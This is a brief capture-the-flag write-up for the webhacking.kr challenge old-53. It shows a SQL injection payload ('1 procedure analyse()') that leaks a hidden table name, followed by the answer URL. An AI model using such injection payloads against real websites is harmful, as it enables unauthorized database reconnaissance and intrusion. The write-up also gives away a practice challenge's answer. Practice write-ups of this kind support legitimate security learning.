# Webhacking old-53 Solution

this is another sql injection problem.

here we inject this payload first in val `1 procedure analyse()`, then we can see this result:
`webhacking.chall53_755fdeb36d873dfdeb2b34487d50a805.a`

so, we now know the secret table, which is: `chall53_755fdeb36d873dfdeb2b34487d50a805`

```
https://webhacking.kr/challenge/web-28/?answer=chall53_755fdeb36d873dfdeb2b34487d50a805
```
